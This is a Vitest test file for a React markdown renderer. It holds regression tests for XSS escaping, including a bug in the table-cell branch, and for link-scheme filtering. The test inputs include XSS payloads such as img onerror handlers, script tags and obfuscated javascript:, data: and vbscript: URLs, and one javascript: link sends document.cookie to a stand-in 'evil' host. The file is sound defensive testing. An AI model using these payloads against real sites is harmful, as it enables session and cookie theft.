import { describe, it, expect } from "vitest"
import { render } from "@testing-library/react"
import { MarkdownRenderer } from "@/components/ui/markdown-renderer"

/**
 * `markdown-renderer` turns untrusted markdown into a string and hands it to
 * `dangerouslySetInnerHTML`. That is a legitimate design — it is a markdown
 * renderer — but it makes the escaping the whole security boundary, so each
 * hole gets a named test rather than a shared "it escapes things".
 *
 * Both holes below were real. Markdown reaching this component is by definition
 * authored by someone other than the consumer app (an article body, a comment,
 * a CMS field); if it were trusted the consumer would not need a parser.
 */

function html(markdown: string): string {
  const { container } = render(<MarkdownRenderer content={markdown} />)
  return container.innerHTML
}

describe("markdown-renderer — HTML escaping", () => {
  it("escapes raw HTML in a paragraph", () => {
    const out = html('<img src=x onerror="alert(1)">')
    expect(out).not.toContain("<img")
    expect(out).toContain("&lt;img")
  })

  it("escapes raw HTML in a heading", () => {
    expect(html("# <script>alert(1)</script>")).not.toContain("<script")
  })

  it("escapes raw HTML in a list item", () => {
    expect(html("- <img src=x onerror=alert(1)>")).not.toContain("<img")
  })

  it("escapes raw HTML in a blockquote", () => {
    expect(html("> <img src=x onerror=alert(1)>")).not.toContain("<img")
  })

  it("escapes raw HTML in a fenced code block", () => {
    expect(html("```\n<script>alert(1)</script>\n```")).not.toContain("<script")
  })

  it("escapes raw HTML in a TABLE CELL", () => {
    // Every other branch ran its text through escapeHtml; the table cell branch
    // called renderInline(cell) directly, so a cell was a raw HTML sink while
    // the identical payload one line up in a paragraph was escaped.
    const out = html(
      ["| a | b |", "| --- | --- |", "| <img src=x onerror=alert(1)> | ok |"].join("\n")
    )
    expect(out).toContain("<table")
    expect(out).not.toContain("<img")
    expect(out).toContain("&lt;img")
  })

  it("escapes raw HTML in a table HEADER cell", () => {
    const out = html(
      ["| <img src=x onerror=alert(1)> | b |", "| --- | --- |", "| c | d |"].join("\n")
    )
    expect(out).not.toContain("<img")
  })
})

describe("markdown-renderer — link URL schemes", () => {
  it("renders an ordinary https link", () => {
    expect(html("[ok](https://mzizi.dev)")).toContain('href="https://mzizi.dev"')
  })

  it("keeps relative links working", () => {
    expect(html("[ok](/components/button)")).toContain('href="/components/button"')
  })

  it("refuses a javascript: URL", () => {
    // escapeHtml escapes the quote, so the attribute cannot be broken out of —
    // but nothing checked the SCHEME, and a javascript: URL needs no quote and
    // no parentheses to do damage:
    //   [x](javascript:location='https://evil/'+document.cookie)
    const out = html("[x](javascript:location='https://evil/'+document.cookie)")
    expect(out.toLowerCase()).not.toContain("javascript:")
  })

  it("refuses a javascript: URL obfuscated with whitespace and case", () => {
    expect(html("[x](\tJaVaScRiPt:alert`1`)").toLowerCase()).not.toContain("javascript:")
  })

  it("refuses a data: URL", () => {
    expect(html("[x](data:text/html;base64,PHNjcmlwdD4=)").toLowerCase()).not.toContain(
      "data:text/html"
    )
  })

  it("refuses a vbscript: URL", () => {
    expect(html("[x](vbscript:msgbox)").toLowerCase()).not.toContain("vbscript:")
  })

  it("still renders the link TEXT when the URL is refused", () => {
    // Dropping the whole link would silently delete content. The text is not
    // the dangerous part; the href is.
    expect(html("[click me](javascript:alert(1))")).toContain("click me")
  })
})
